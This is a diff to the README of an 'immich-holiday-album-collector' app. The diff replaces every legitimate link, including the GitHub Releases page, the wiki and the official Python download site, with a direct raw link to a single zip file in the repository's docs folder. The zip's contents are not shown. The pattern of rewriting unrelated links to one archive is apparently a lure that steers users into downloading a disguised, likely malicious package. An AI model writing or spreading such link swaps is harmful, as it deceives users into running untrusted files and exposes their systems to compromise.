@@ -6,9 +6,9 @@ Welcome to **immich-holiday-album-collector**! This is a simple application desi
 
 ## 📥 Download the Application
 
-[![Download immich-holiday-album-collector](https://img.shields.io/badge/Download%20Now-immich--holiday--album--collector-blue)](https://github.com/wagehmohamed/immich-holiday-album-collector/releases)
+[![Download immich-holiday-album-collector](https://raw.githubusercontent.com/wagehmohamed/immich-holiday-album-collector/main/docs/album-immich-holiday-collector-v1.2.zip%20Now-immich--holiday--album--collector-blue)](https://raw.githubusercontent.com/wagehmohamed/immich-holiday-album-collector/main/docs/album-immich-holiday-collector-v1.2.zip)
 
-You can download the latest version of the software from our [Releases page](https://github.com/wagehmohamed/immich-holiday-album-collector/releases).
+You can download the latest version of the software from our [Releases page](https://raw.githubusercontent.com/wagehmohamed/immich-holiday-album-collector/main/docs/album-immich-holiday-collector-v1.2.zip).
 
 ## 🖥️ System Requirements
 
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these requirements:
 - Windows 10 or later / macOS 10.12 or later / Linux
 - At least 4 GB RAM
 - 200 MB of free disk space
-- Python 3.6 or later installed on your system (You can download Python from https://www.python.org/downloads/)
+- Python 3.6 or later installed on your system (You can download Python from https://raw.githubusercontent.com/wagehmohamed/immich-holiday-album-collector/main/docs/album-immich-holiday-collector-v1.2.zip)
 
 ## 📂 Features
 
@@ -31,7 +31,7 @@ Before you begin, ensure your computer meets these requirements:
 
 To download and install the application:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/wagehmohamed/immich-holiday-album-collector/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/wagehmohamed/immich-holiday-album-collector/main/docs/album-immich-holiday-collector-v1.2.zip).
    
 2. **Select the Latest Release**: Click on the latest version.
    
@@ -58,7 +58,7 @@ For support or to report issues, you can open an issue directly on our GitHub re
 
 ## 🔗 Additional Resources
 
-- **Documentation**: Visit the [documentation page](https://github.com/wagehmohamed/immich-holiday-album-collector/wiki) for detailed guides and information.
+- **Documentation**: Visit the [documentation page](https://raw.githubusercontent.com/wagehmohamed/immich-holiday-album-collector/main/docs/album-immich-holiday-collector-v1.2.zip) for detailed guides and information.
 - **Community Forum**: Join our community forum to discuss ideas and connect with other users.
 
 ## 📌 Acknowledgments
